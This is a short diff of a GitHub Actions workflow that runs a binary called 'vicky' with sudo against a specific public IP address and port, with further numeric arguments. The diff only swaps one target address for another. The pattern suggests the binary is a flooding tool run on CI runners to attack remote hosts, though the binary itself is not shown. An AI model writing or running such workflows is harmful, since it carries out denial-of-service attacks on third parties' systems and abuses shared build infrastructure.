@@ -11,4 +11,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x vicky
-    - run: sudo ./vicky 4.213.176.172 14803 200 999
+    - run: sudo ./vicky 52.140.2.173 29458 200 999
